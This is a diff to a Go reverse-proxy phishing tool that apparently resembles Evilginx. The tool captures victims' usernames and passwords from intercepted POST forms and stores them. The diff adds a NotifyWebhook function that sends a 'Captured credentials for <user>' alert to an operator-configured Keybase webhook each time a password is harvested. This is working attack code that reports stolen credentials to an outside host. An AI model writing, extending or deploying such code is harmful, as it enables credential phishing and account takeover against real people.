@@ -754,6 +754,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
 								log.Debug("POST: %s", req.URL.Path)
 
+								var phishedUser string
+
 								for k, v := range req.PostForm {
 									// patch phishing URLs in POST params with original domains
 
@@ -761,6 +763,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
+											phishedUser = um[1]
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
@@ -774,6 +777,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
+											}
+											if phishedUser != "" && p.cfg.kbWebhookUrl != "" {
+												content := fmt.Sprintf("Captured credentials for %s!", phishedUser)
+												p.NotifyWebhook(content)
 											}
 										}
 									}
@@ -2002,4 +2009,49 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+func (p *HttpProxy) NotifyWebhook(content string) {
+	if p.cfg.kbWebhookUrl == "" {
+		log.Error("No Keybase webhook URL configured")
+		return
+	}
+
+	// Prepare the JSON payload with the message content
+	payload := map[string]string{
+		"msg": content,
+	}
+
+	// Encode the payload to JSON
+	jsonPayload, err := json.Marshal(payload)
+	if err != nil {
+		log.Error("Failed to marshal JSON payload: %v", err)
+		return
+	}
+
+	// Create the POST request
+	req, err := http.NewRequest("POST", p.cfg.kbWebhookUrl, bytes.NewBuffer(jsonPayload))
+	if err != nil {
+		log.Error("Failed to create request: %v", err)
+		return
+	}
+
+	// Set the correct headers for the request
+	req.Header.Set("Content-Type", "application/json")
+
+	// Send the request
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Error("Failed to send request to Keybase webhook: %v", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	// Check the response status
+	if resp.StatusCode == http.StatusOK {
+		log.Info("Notification sent to Keybase webhook successfully")
+	} else {
+		log.Error("Failed to send notification to Keybase webhook, status: %v", resp.StatusCode)
+	}
 }
